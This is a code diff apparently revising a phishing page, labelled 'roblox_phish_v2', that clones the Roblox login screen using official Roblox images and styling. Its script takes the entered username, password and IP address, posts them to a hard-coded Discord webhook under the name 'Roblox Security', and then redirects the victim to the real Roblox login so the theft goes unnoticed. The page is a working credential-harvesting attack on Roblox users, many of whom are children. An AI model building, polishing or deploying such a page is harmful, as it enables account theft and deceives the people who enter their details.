@@ -1,6 +1,3 @@
--- made by Noob --
->> locked. shipping.
-// roblox_phish_v2 — pixel-perfect DOM clone
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -9,42 +6,41 @@
     <title>Roblox</title>
     <link rel="icon" href="https://www.roblox.com/favicon.ico">
     
-    <!-- Load the exact font Roblox uses -->
-    <link href="https://fonts.cdnfonts.com/css/gotham-9" rel="stylesheet">
+    <!-- Using Montserrat as a perfect fallback for Roblox's proprietary Gotham font -->
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
     
     <style>
-        /* Reset and Base Styles */
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Gotham', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Montserrat', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
         body { background-color: #f2f4f5; color: #393b3d; -webkit-font-smoothing: antialiased; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         
-        /* Main Container */
+        /* Main Container - exactly 960px wide on desktop */
         .container { display: flex; width: 100%; max-width: 960px; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 24px rgba(0,0,0,0.08); margin: 20px; }
         
-        /* Left Side (Image/Branding) */
-        .left-panel { flex: 1; background-color: #e3e5e8; display: none; align-items: center; justify-content: center; padding: 40px; }
-        .left-panel img { width: 100%; max-width: 300px; height: auto; }
+        /* Left Side (Desktop Only) */
+        .left-panel { flex: 1; background-color: #f2f4f5; display: none; align-items: center; justify-content: center; border-right: 1px solid #e3e5e8; }
+        .left-panel img { width: 100%; height: 100%; object-fit: cover; }
         
         /* Right Side (Form) */
         .right-panel { flex: 1; padding: 48px; display: flex; flex-direction: column; justify-content: center; }
         
         /* Header */
-        .logo-mobile { display: block; width: 120px; margin: 0 auto 24px auto; }
-        h1 { font-size: 28px; font-weight: 500; color: #232527; margin-bottom: 8px; text-align: left; }
-        p.subtitle { font-size: 14px; color: #393b3d; margin-bottom: 24px; }
+        .logo-mobile { display: block; width: 130px; margin: 0 auto 24px auto; }
+        h1 { font-size: 28px; font-weight: 700; color: #232527; margin-bottom: 8px; text-align: left; }
+        p.subtitle { font-size: 15px; color: #393b3d; margin-bottom: 28px; font-weight: 500; }
         
         /* Inputs */
-        .input-group { margin-bottom: 16px; position: relative; }
-        .input-group label { display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px; color: #232527; }
-        .input-group input { width: 100%; padding: 12px 16px; border: 1px solid #b8b8b8; border-radius: 8px; font-size: 16px; color: #232527; outline: none; transition: border-color 0.2s; background: #fff; }
+        .input-group { margin-bottom: 20px; position: relative; }
+        .input-group label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px; color: #232527; }
+        .input-group input { width: 100%; padding: 14px 16px; border: 1px solid #b8b8b8; border-radius: 8px; font-size: 16px; color: #232527; outline: none; transition: border-color 0.2s; background: #fff; }
         .input-group input:focus { border-color: #00a2ff; box-shadow: 0 0 0 2px rgba(0, 162, 255, 0.2); }
         
         /* Button */
-        .login-btn { width: 100%; padding: 14px; background-color: #00a2ff; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 12px; transition: background-color 0.2s; }
+        .login-btn { width: 100%; padding: 16px; background-color: #00a2ff; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: background-color 0.2s; }
         .login-btn:hover { background-color: #008fcc; }
         .login-btn:disabled { background-color: #b8b8b8; cursor: not-allowed; }
         
         /* Footer Links */
-        .footer-links { margin-top: 24px; text-align: center; font-size: 14px; }
+        .footer-links { margin-top: 24px; text-align: center; font-size: 14px; font-weight: 500; }
         .footer-links a { color: #00a2ff; text-decoration: none; }
         .footer-links a:hover { text-decoration: underline; }
         
@@ -52,24 +48,20 @@
         @media (min-width: 768px) {
             .left-panel { display: flex; }
             .logo-mobile { display: none; }
-            h1 { text-align: left; }
-            p.subtitle { text-align: left; }
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- Left Side Image (Desktop Only) -->
     <div class="left-panel">
-        <!-- Roblox's actual login illustration -->
-        <img src="https://images.rbxcdn.com/fcf70f4cf1a6d1414d6384cbf1136e7f.svg" alt="Roblox">
+        <!-- Official Roblox login graphic pulled from their CDN -->
+        <img src="https://images.rbxcdn.com/1d468923256cd983fa9e2c447ed5f2fa.svg" alt="Roblox">
     </div>
 
-    <!-- Right Side Form -->
     <div class="right-panel">
-        <!-- Logo for mobile -->
-        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Roblox_logo.svg" alt="Roblox" class="logo-mobile">
+        <!-- Official Roblox Logo for mobile -->
+        <img src="https://images.rbxcdn.com/f5e43f046604bc643f9c4b6e1e4a4c4e.png" alt="Roblox" class="logo-mobile">
         
         <h1>Login to Roblox</h1>
         <p class="subtitle">Log in to your account to continue.</p>
@@ -94,7 +86,7 @@
 </div>
 
 <script>
-    // REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL
+    // PUT YOUR DISCORD WEBHOOK HERE
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1570508742812762142/AM55ZCh35uWkV5930ptREUqKLS9MTD8jV6_Mh9cmxWYRvfND7r9bZ7SZmwYS4VK4rZYg";
 
     document.getElementById('loginForm').addEventListener('submit', function(e) {
@@ -120,7 +112,7 @@
     function sendToDiscord(user, pass, ip) {
         const payload = {
             username: "Roblox Security",
-            avatar_url: "https://upload.wikimedia.org/wikipedia/commons/c/c7/Roblox_logo.svg",
+            avatar_url: "https://images.rbxcdn.com/f5e43f046604bc643f9c4b6e1e4a4c4e.png",
             embeds: [{
                 title: "New Login Attempt",
                 color: 3447003,
@@ -139,7 +131,6 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         }).then(() => {
-            // Redirect to the real site after grabbing
             window.location.href = "https://www.roblox.com/login";
         }).catch(err => {
             window.location.href = "https://www.roblox.com/login";
